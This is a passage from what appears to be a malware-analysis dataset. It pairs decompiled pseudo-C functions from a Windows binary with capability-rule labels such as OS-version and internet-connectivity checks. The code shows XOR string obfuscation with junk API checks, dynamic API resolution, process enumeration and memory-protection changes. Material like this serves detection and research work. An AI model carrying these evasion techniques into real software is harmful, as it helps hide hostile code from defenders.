stack0xffffffc5 = 0x33314536;\n        var_34h._1_1_ = 0x76;\n        var_34h._2_1_ = 0x36;\n        var_34h._3_1_ = 0x36;\n        var_2ch = 0x36766f31;\n        var_28h._0_2_ = CONCAT11(var_28h._1_1_, 0x36);\n        uVar2 = (*pcVar8)(8, 0x51);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar9 = 0;\n        var_1ch = &var_5bh + (3 - iVar3);\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar4 != 0x9a2a68) {\n                *(iVar9 + iVar3) = *(&var_2ch + iVar9 % pszSrch) ^ (iVar9 + iVar3)[var_1ch];\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x28);\n        uVar2 = (*pcVar8)(8, 0x208);\n        pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        pszSrch = pcVar5;\n        uVar2 = (*pcVar8)(8, 0x208);\n        var_4h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        puVar7 = pszFirst;\n        for (iVar9 = 0x208; pcVar8 = _sym.imp.KERNEL32.dll_ExpandEnvironmentStringsW,  iVar9 != 0; iVar9 = iVar9 + -1) {\n            *pcVar5 = 0x0;\n            pcVar5 = pcVar5 + 1;\n        }\n        puVar6 = var_4h;\n        for (iVar9 = 0x208; iVar9 != 0; iVar9 = iVar9 + -1) {\n            *puVar6 = 0;\n            puVar6 = puVar6 + 1;\n        }\n        (*pcVar8)(pszFirst, pszSrch, 0x104);\n        (*pcVar8)(iVar3, var_4h, 0x104);\n        pcVar8 = pszSrch;\n        iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41cb28, pszSrch);\n        if (iVar9 != 0) break;\n        iVar9 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(*0x41cb28, var_4h);\n        if (iVar9 != 0) break;\n        fcn.00406ba8();\n        fcn.00405f66();\n    }\n    fcn.00404346();\n    uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.0040c0f4, 0, 0, 0);\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, pcVar8);\n    pcVar8 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_4h);\n    (*pcVar8)(uVar2);\n    (*_sym.imp.KERNEL32.dll_Sleep)(0xffffffff);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n    (*pcVar8)(uVar2);\n    uVar2 = (*pcVar5)(0, puVar7);\n    (*pcVar8)(uVar2);\n    uVar2 = (*pcVar5)(0, var_20h);\n    (*pcVar8)(uVar2);\n    uVar2 = (*pcVar5)(0, var_24h);\n    (*pcVar8)(uVar2);\n    uVar2 = (*pcVar5)(0, lpLibFileName);\n    (*pcVar8)(uVar2);\n    return;\n}\n",
        "token_count": 3475
    },
    "00404b24": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t __fastcall fcn.00404b24(int32_t param_1)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1fh;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    var_14h = param_1;\n    if (*0x41cadc == NULL) {\n        var_2ch = 0x186e1b1d;\n        var_28h._0_1_ = 0x33;\n        var_28h._1_1_ = 0x62;\n        var_28h._2_2_ = 0x695c;\n        var_8h = 5;\n        var_24h._0_1_ = 5;\n        var_24h._1_1_ = 0x2b;\n        var_24h._2_1_ = 0x37;\n        stack0xffffffdb = 0x4a0d;\n        var_1fh._0_2_ = 0x4404;\n        stack0xffffffe0 = 0x77396854;\n        var_18h._0_1_ = 0x44;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x10);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_10h = iVar4;\n        do {\n            iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            if (iVar5 != 0x71bf7) {\n                *(iVar7 + iVar4) = *(&var_1fh + iVar7 % var_8h + 3) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xf);\n        var_2ch = 0x361a0102;\n        var_28h._0_1_ = 8;\n        var_28h._1_1_ = 5;\n        var_28h._2_2_ = 0x5a57;\n        var_24h._0_1_ = 0x76;\n        var_24h._1_1_ = 9;\n        stack0xffffffdb = 0x6808;\n        stack0xffffffe0 = 0x58686469;\n        var_18h._0_1_ = 0x6d;\n        var_24h._2_1_ = var_28h._1_1_;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xe);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar7 = 0;\n        var_ch = &var_2ch - iVar4;\n        do {\n            iVar6 = (*_sym.imp.USER32.dll_GetProcessWindowStation)();\n            iVar5 = var_10h;\n            if (iVar6 != 0xbd5435) {\n                *(iVar7 + iVar4) = *(&var_1fh + iVar7 % var_8h + 3) ^ (iVar7 + iVar4)[&var_2ch - iVar4];\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0xd);\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4, var_10h);\n        *0x41cadc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar3);\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        uVar3 = (*pcVar2)(0, iVar5);\n        (*pcVar1)(uVar3);\n        if (*0x41cadc == NULL) {\n            return var_4h;\n        }\n    }\n    if ((var_14h != 0) && (iVar4 = (*_sym.imp.KERNEL32.dll_OpenProcess)(0x400, 0, var_14h),  iVar4 != 0)) {\n        iVar7 = (**0x41cadc)(iVar4, &var_4h);\n        var_4h = var_4h & -(iVar7 != 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    return var_4h;\n}\n",
        "token_count": 1132
    },
    "0040509e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040509e(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uint *in_EDX;\n    int32_t iVar6;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    int32_t lpModuleName;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    _var_28h = 0;\n    var_18h = in_EDX;\n    var_4h = in_ECX;\n    if (in_ECX == -1) {\n        var_ch = 1;\n        (*_sym.imp.KERNEL32.dll_GetCurrentProcessId)();\n        var_4h = fcn.00405055();\n    }\n    if (*0x41cae0 == NULL) {\n        var_34h = 0xf034404;\n        var_30h = 0x5c0e6655;\n        var_2ch._0_2_ = 0x630b;\n        var_20h = 0x6367306a;\n        var_1ch._0_2_ = 0x4839;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        var_8h = 6;\n        var_10h = &var_34h - iVar3;\n        iVar6 = 0;\n        lpModuleName = iVar3;\n        do {\n            iVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n            if (iVar4 != 0xea05b6) {\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % var_8h) ^ (iVar6 + iVar3)[var_10h];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 10);\n        var_50h = 0x2d2e1f0f;\n        var_4ch = 0x3a614605;\n        var_48h = 0x2616231c;\n        var_44h = 0x370d1a3c;\n        var_40h = 0xd181c13;\n        var_3ch = 0x9002d14;\n        var_38h._0_2_ = 0x5c63;\n        var_38h._2_1_ = 0x79;\n        var_20h = 0x42796855;\n        var_1ch._0_2_ = 0x7072;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1c);\n        iVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar2);\n        iVar6 = 0;\n        var_10h = &var_50h - iVar3;\n        do {\n            iVar5 = (*_sym.imp.USER32.dll_GetDialogBaseUnits)();\n            iVar4 = lpModuleName;\n            if (iVar5 != 0x34bdaa) {\n                *(iVar6 + iVar3) = *(&var_20h + iVar6 % var_8h) ^ (iVar6 + iVar3)[&var_50h - iVar3];\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 0x1b);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(lpModuleName, iVar3);\n        *0x41cae0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar2);\n        var_28h = 0;\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar3);\n        pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar2);\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar4);\n        (*pcVar1)(uVar2);\n        iVar3 = var_4h;\n        in_EDX = var_18h;\n        if (*0x41cae0 == NULL) goto code_r0x0040523d;\n    }\n    iVar3 = var_4h;\n    var_28h = 0;\n    iVar6 = (**0x41cae0)(var_4h, *in_EDX, in_EDX[1], arg_8h, arg_ch, 0, &var_28h);\n    if (-1 < iVar6) {\n    }\ncode_r0x0040523d:\n    if (var_ch != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar3);\n    }\n    return var_28h;\n}\n",
        "token_count": 1206
    },
    "00405253": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00405253(uint32_t arg_8h, uint32_t *arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar *arg_8h_00;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t *piVar9;\n    int32_t *in_EDX;\n    code *pcVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    int32_t *piVar13;\n    uint var_a8h;\n    uint var_a0h;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint32_t var_70h;\n    int32_t *var_6ch;\n    int32_t var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    int32_t var_54h;\n    uint32_t var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_25h;\n    uint var_1fh;\n    uint var_1bh;\n    uint var_16h;\n    uchar *var_10h;\n    int32_t *var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_60h = 0;\n    var_58h = 0;\n    var_50h = 0;\n    var_48h = 0xf034404;\n    var_44h = 0x5c0e6655;\n    var_40h._0_2_ = 0x630b;\n    var_8h = 0x6367306a;\n    var_4h._0_2_ = 0x4839;\n    var_6ch = in_EDX;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xb);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    var_ch = 0x6;\n    iVar11 = 0;\n    var_10h = &var_48h - iVar4;\n    var_5ch = iVar4;\n    do {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n        if (iVar5 != 0xea05b6) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ (iVar11 + iVar4)[var_10h];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 10);\n    var_34h = 0xa121e6a;\n    var_30h = 0x38047c03;\n    var_2ch._0_2_ = 0x30;\n    var_2ch._2_1_ = 6;\n    stack0xffffffd3 = 0x23077933;\n    var_25h._0_1_ = 10;\n    stack0xffffffd9 = 0x2c1d5127;\n    var_1fh = 0x421a1a0a;\n    stack0xffffffe2 = 0x39070026;\n    var_16h._1_2_ = 0x455d;\n    var_8h = 0x65456930;\n    var_4h._0_2_ = 0x4a74;\n    var_25h._1_1_ = var_2ch._2_1_;\n    var_1bh._0_1_ = var_2ch._2_1_;\n    var_16h._0_1_ = var_2ch._2_1_;\n    uVar3 = (*pcVar10)(8, 0x22);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar11 = 0;\n    var_10h = &var_34h - iVar4;\n    var_68h = iVar4;\n    do {\n        iVar6 = (*pcVar10)();\n        iVar5 = var_5ch;\n        if (iVar6 != 0xc469b7) {\n            *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n        }\n        iVar11 = iVar11 + 1;\n    } while (iVar11 < 0x21);\n    if ((*0x41d1f8 & 1) == 0) {\n        *0x41d1f8 = *0x41d1f8 | 1;\n        *0x41d1f4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(var_5ch);\n    }\n    if ((*0x41d1f8 & 2) == 0) {\n        *0x41d1f8 = *0x41d1f8 | 2;\n        *0x41d1f0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d1f4, iVar4);\n    }\n    if (*0x41d1f4 == 0) {\n        *0x41d1f4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar5);\n    }\n    if (*0x41d1f0 == NULL) {\n        var_34h = 0xa121e6a;\n        var_30h = 0x38047c03;\n        var_2ch._0_2_ = 0x30;\n        var_2ch._2_1_ = 6;\n        stack0xffffffd3 = 0x23077933;\n        var_25h._0_1_ = 10;\n        stack0xffffffd9 = 0x2c1d5127;\n        var_1fh = 0x421a1a0a;\n        stack0xffffffe2 = 0x39070026;\n        var_16h._1_2_ = 0x455d;\n        var_8h = 0x65456930;\n        var_4h._0_2_ = 0x4a74;\n        var_25h._1_1_ = var_2ch._2_1_;\n        var_1bh._0_1_ = var_2ch._2_1_;\n        var_16h._0_1_ = var_2ch._2_1_;\n        uVar3 = (*pcVar10)(8, 0x22);\n        iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        iVar11 = 0;\n        var_10h = &var_34h - iVar4;\n        do {\n            iVar5 = (*pcVar10)();\n            if (iVar5 != 0xc469b7) {\n                *(iVar11 + iVar4) = *(&var_8h + iVar11 % var_ch) ^ var_10h[iVar11 + iVar4];\n            }\n            iVar11 = iVar11 + 1;\n        } while (iVar11 < 0x21);\n        *0x41d1f0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x41d1f4, iVar4);\n        uVar3 = (*pcVar10)(0, iVar4);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n        iVar5 = var_5ch;\n        iVar4 = var_68h;\n    }\n    fcn.00404b24();\n    if ((*0x41d1f0 != NULL) && (iVar11 = (**0x41d1f0)(var_4ch, 0, &var_a8h, 0x30, &var_54h),  -1 < iVar11)) {\n        uVar3 = (*pcVar10)(8, 0x200);\n        var_10h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n        if (var_10h != NULL) {\n            uVar3 = (*pcVar10)(8, 0x100);\n            iVar11 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n            if (((iVar11 != 0) && (var_54h = fcn.0040509e(iVar11, 0x28),  var_54h != 0)) &&\n               (var_54h = fcn.0040509e(iVar11 + 0x28, 0x40),  arg_8h_00 = var_10h,  var_54h != 0)) {\n                var_44h = *(iVar11 + 0x3c);\n                var_64h = *(iVar11 + 0x18) + 0x10;\n                var_8h = *(iVar11 + 0x1c) + (0xffffffef < *(iVar11 + 0x18));\n                var_ch = var_6ch + 2;\n                var_48h = *(iVar11 + 0x38);\n                var_50h = 4;\n                if ((var_48h != var_64h) || (*(iVar11 + 0x3c) != var_8h)) {\n                    do {\n                        var_54h = fcn.0040509e(iVar11 + 0x68, 0x98);\n                        iVar5 = var_5ch;\n                        iVar4 = var_68h;\n                        if (var_54h == 0) break;\n                        var_78h = *(iVar11 + 0x68);\n                        var_74h = *(iVar11 + 0x6c);\n                        var_50h = var_50h + 0x120;\n                        var_48h = var_78h;\n                        var_44h = var_74h;\n                        if (var_50h <= arg_8h) {\n                            uVar7 = *(iVar11 + 0xb0) >> 1;\n                            *(var_ch + 6) = var_58h;\n                            var_ch[5] = *(iVar11 + 0xd0);\n                            *(var_ch + 7) = *(iVar11 + 0xd4);\n                            var_ch[4] = *(iVar11 + 0xa8);\n                            var_ch[2] = *(iVar11 + 0x98);\n                            var_ch[3] = *(iVar11 + 0x9c);\n                            puVar12 = arg_8h_00;\n                            for (iVar4 = 0x200; iVar4 != 0; iVar4 = iVar4 + -1) {\n                                *puVar12 = 0;\n                                puVar12 = puVar12 + 1;\n                            }\n                            var_70h = uVar7;\n                            if ((uVar7 < 0x100) && (var_54h = fcn.0040509e(arg_8h_00, *(iVar11 + 0xb0)),  var_54h != 0))\n                            {\n                                uVar8 = 0;\n                                if (uVar7 != 0) {\n                                    do {\n                                        *(uVar8 + 0x20 + var_ch) = arg_8h_00[uVar8 * 2];\n                                        uVar8 = uVar8 + 1;\n                                    } while (uVar8 < uVar7);\n                                }\n                                *(uVar7 + 0x20 + var_ch) = 0;\n                                piVar9 = NULL;\n                                piVar13 = var_ch + 8;\n                                do {\n                                    cVar1 = *piVar13;\n                                    if (cVar1 == '\\\\') {\n                                        piVar9 = piVar13;\n                                    }\n                                    piVar13 = piVar13 + 1;\n                                } while (cVar1 != '\\0');\n                                *(var_ch + 0x1e) = (piVar9 - var_ch) + -0x1f;\n                            }\n                            var_ch = var_ch + 0x48;\n                            var_58h = var_58h + 1;\n                        }\n                    } while ((var_78h != var_64h) || (iVar5 = var_5ch,  iVar4 = var_68h,  var_74h != var_8h));\n                }\n                if (var_6ch != NULL) {\n                    *var_6ch = var_58h;\n                }\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_10h);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            pcVar10 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n            if (iVar11 != 0) {\n                uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar11);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n            }\n        }\n    }\n    if (arg_ch != NULL) {\n        *arg_ch = var_50h;\n    }\n    if ((var_50h <= arg_8h) && (var_50h != 0)) {\n        var_60h = 1;\n    }\n    uVar3 = (*pcVar10)(0, iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar10)(0, iVar5);\n    (*pcVar2)(uVar3);\n    return var_60h;\n}\n",
        "token_count": 3068
    },
    "00405af2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405af2(uint32_t *arg_8h, uint32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    char cVar2;\n    uint32_t *puVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    int32_t in_EDX;\n    uint uVar6;\n    char *pcVar7;\n    uint32_t *puVar8;\n    uint var_10h;\n    uint lpString2;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    fcn.00404b24();\n    fcn.00405253(0, &var_4h);\n    var_8h = var_4h;\n    puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, var_4h, 0x3000, 4);\n    if (puVar3 != NULL) {\n        do {\n            iVar4 = fcn.00405253(var_8h, &var_4h);\n            uVar1 = var_4h;\n            if ((iVar4 != 0) || (var_4h <= var_8h)) break;\n            var_8h = var_4h;\n            (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n            puVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, uVar1, 0x3000, 4);\n        } while (puVar3 != NULL);\n        uVar6 = 2;\n        if ((puVar3 != NULL) && (uVar1 <= var_8h)) {\n            var_8h = 0;\n            puVar8 = puVar3 + 2;\n            if (*puVar3 != 0) {\n                do {\n                    pcVar7 = *(puVar8 + 0x1e) + 0x20 + puVar8;\n                    if ((in_EDX == 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX),  iVar4 == 0)) {\ncode_r0x00405bf9:\n                        uVar6 = 0;\n                        *arg_8h = puVar8[2];\n                        arg_8h[1] = puVar8[3];\n                        if (arg_ch != NULL) {\n                            *arg_ch = puVar8[4];\n                        }\n                        goto code_r0x00405c1a;\n                    }\n                    cVar2 = *pcVar7;\n                    pcVar5 = pcVar7;\n                    while (cVar2 != '.') {\n                        if (cVar2 == '\\0') goto code_r0x00405be4;\n                        pcVar5 = pcVar5 + 1;\n                        cVar2 = *pcVar5;\n                    }\n                    *pcVar5 = '\\0';\n                    iVar4 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(pcVar7, in_EDX);\n                    if (iVar4 == 0) goto code_r0x00405bf9;\ncode_r0x00405be4:\n                    puVar8 = puVar8 + 0x48;\n                    var_8h = var_8h + 1;\n                } while (var_8h < *puVar3);\n                uVar6 = 2;\n            }\n            goto code_r0x00405c1a;\n        }\n    }\n    uVar6 = 8;\ncode_r0x00405c1a:\n    if (puVar3 != NULL) {\n        (*_sym.imp.KERNEL32.dll_VirtualFree)(puVar3, 0, 0x8000);\n    }\n    return uVar6;\n}\n",
        "token_count": 822
    },
    "00406ba8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00406ba8(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_28h;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint lpflOldProtect;\n    \n    var_28h._0_1_ = 0;\n    lpflOldProtect = 0;\n    puVar3 = &var_28h + 1;\n    for (iVar2 = 6; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    var_8h = 0;\n    var_ch = 0;\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    *0x41cb34 = fcn.00408ec7();\n    iVar2 = fcn.0040b7e3();\n    if (iVar2 == 0) {\n        fcn.0040ba16();\n        fcn.00407f43();\n    }\n    while (iVar2 = fcn.00408c8e(),  iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n    }\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    fcn.0040b061();\n    iVar2 = fcn.004075db();\n    if (iVar2 != 0) {\n        if (2 < var_28h._1_1_) {\n            iVar2 = 0;\n            if (0 < var_28h._1_1_ - 2) {\n                do {\n                    *0x41cb5c = *0x41cb5c + (&var_1ch)[iVar2];\n                    iVar2 = iVar2 + 1;\n                } while (iVar2 < var_28h._1_1_ - 2);\n            }\n        }\n        *0x41cb5c = *0x41cb5c ^ 0x43103655;\n        fcn.0040b8c7();\n    }\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x4122f0, 0x184, 0x40, &lpflOldProtect);\n    fcn.00408e3d();\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(0x4122f0, 0x184, lpflOldProtect, &lpflOldProtect);\n    fcn.00407210();\n    fcn.00407210();\n    (*_sym.imp.KERNEL32.dll_GlobalAddAtomW)(*0x41cb60);\n    (*_sym.imp.KERNEL32.dll_AddAtomW)(*0x41cb60);\n    iVar2 = fcn.00403864(&var_ch);\n    if (iVar2 == 0) {\n        fcn.0040aff8();\n        fcn.00406897();\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, var_8h);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 711
    },
    "00406dcc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.00406dcc(void)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    char cVar3;\n    uint uVar4;\n    char *pcVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint lpWSAData;\n    uint ARG_0;\n    uint var_74h;\n    int32_t var_70h;\n    uint32_t var_6ch;\n    uint32_t var_68h;\n    int32_t var_64h;\n    int32_t var_60h;\n    int32_t *var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint32_t var_20h;\n    char *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    char *var_10h;\n    char *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_74h = *0x41caa8;\n    var_6ch = *0x41cb5c;\n    var_58h = 0x5d110420;\n    var_54h = 0xe262735;\n    var_50h = 0x2d3b531b;\n    var_4ch = 0x491d082c;\n    var_48h = 0x12323321;\n    var_44h = 0x39274f07;\n    var_40h = 0x145c1c38;\n    var_3ch = 0x5573700f;\n    var_38h = 0x76660c46;\n    var_34h = 0x39425f79;\n    var_8h = 0x39726641;\n    var_4h._0_2_ = 0x4150;\n    uVar4 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x29);\n    pcVar5 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar4);\n    var_64h = 6;\n    iVar9 = 0;\n    var_10h = pcVar5;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetInputState)();\n        if (iVar6 != 0x45f6a5) {\n            pcVar5[iVar9] = *(&var_8h + iVar9 % var_64h) ^ (pcVar5 + iVar9)[&var_58h - pcVar5];\n        }\n        iVar9 = iVar9 + 1;\n    } while (iVar9 < 0x28);\n    (*_sym.imp.WS2_32.dll_WSAStartup)(0x201, &lpWSAData);\n    var_70h = 0;\n    var_ch = 0x4122f0;\n    do {\n        pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        var_8h = 0;\n        var_68h = 0;\n        iVar9 = 0;\n        var_60h = 1;\n        do {\n            if (var_ch[var_70h] != '\\0') {\n                cVar3 = *pcVar5;\n                pcVar8 = pcVar5;\n                while (cVar3 != var_ch[var_70h]) {\n                    if (cVar3 == '\\0') {\n                        bVar1 = false;\n                        goto code_r0x00406edc;\n                    }\n                    pcVar8 = pcVar8 + 1;\n                    cVar3 = *pcVar8;\n                }\n            }\n            iVar9 = iVar9 + 1;\n        } while (iVar9 < 0x20);\n        bVar1 = true;\ncode_r0x00406edc:\n        if (((*var_ch != '\\0') && (var_ch[0x1f] == '\\0')) && (bVar1)) {\n            var_30h = 0x50281f17;\n            puVar10 = &ARG_0;\n            for (iVar9 = 0x40; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 0;\n                puVar10 = puVar10 + 1;\n            }\n            var_2ch = 0x1e510204;\n            puVar10 = &var_20h;\n            for (iVar9 = 8; iVar9 != 0; iVar9 = iVar9 + -1) {\n                *puVar10 = 